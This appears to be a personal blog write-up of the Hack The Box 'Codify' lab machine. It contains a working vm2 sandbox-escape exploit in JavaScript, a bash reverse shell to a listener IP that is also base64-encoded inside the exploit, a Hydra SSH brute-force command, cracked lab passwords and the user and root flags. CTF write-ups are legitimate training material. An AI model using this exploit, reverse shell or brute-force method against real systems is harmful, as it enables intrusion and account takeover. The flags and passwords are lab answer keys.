---
layout: post
title: "Hack The Box - Codify"
categories: guide
author:
- th4ntis
---

This is my walkthrough on [Codify](https://app.hackthebox.com/machines/Codify)

# Initial Scan

```nmap
sudo nmap -T4 -v 10.129.82.199
sudo nmap -T4 -Pn -p 22,80,3000 -sV -sC -v 10.129.82.199 -oA Codify
```

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(15).png)

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(17).png)

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(18).png)

# HTTP

Had to edit the host file to get the Webpage

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(16).png)

Checking out their About Us page

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(19).png)

Looking around for VM2 CVE's, found [this article on snyk](https://security.snyk.io/vuln/SNYK-JS-VM2-5537100) about RCE with VM2 after seeing a couple others. Testing the other PoC's I didn't get anywhere until I found this one. We can run commands on the host bypassing the VM.

```javascript
const { VM } = require("vm2");
const vm = new VM();

const code = `
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("ls -al").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
`;

console.log(vm.run(code)); // -> hacked
```

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(20).png)

whoami shows us the `svc` user. Also looking at `/etc/passwd` we see an additional user, `joshua`

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(21).png)

## BruteForce

Trying to run Hydra against the user joshua for a password

```bash
hydra -l joshua -P /usr/share/wordlists/rockyou.txt -V ssh://10.129.82.199
```

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(22).png)

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(23).png)

`joshua:spongebob1`

### Obtaining shell

Working to get a shall as svc. Looking around for reverse shell, I found [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp).

```bash
bash -i >& /dev/tcp/10.10.14.53/1234 0>&1
```

Running it normally didn't work so I encoded it

```
echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41My8xMjM0IDA+JjE=' | base64 -d | bash"
```

Full command

```bash
const { VM } = require("vm2");
const vm = new VM();

const code = `
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41My8xMjM0IDA+JjE=' | base64 -d | bash").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
`;

console.log(vm.run(code)); // -> hacked
```

# Foothold

We have shell as svc

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(24).png)

Seeing what permissions we have

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(25).png)

# User Flag

After getting into shell from the SVC user, I got Joshuas password with hydra.

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(26).png)

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(27).png)

User flag: `c53cdd4688463871ba3f4020ab6f3ccb`

# Priv Esc

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(28).png)

We have run the note of "User joshua may run the following commands on codify: (root) /opt/scripts/mysql-backup.sh" So looking at the shell file

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(29).png)

Running that as root as get

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(30).png)

Get [PSPY](https://github.com/DominicBreuker/pspy) Initiate another SSH session. Get pspy64 onto the target machine, run it, then run the `/opt/scripts/mysql-backup.sh` script

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(31).png)

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(32).png)

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(33).png)

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(34).png)

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(35).png)

Root pass: `kljh12k3jhaskjh12kjh3`

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(36).png)

Root flag: `4e43f866588b3b3433196af3cef8b768`
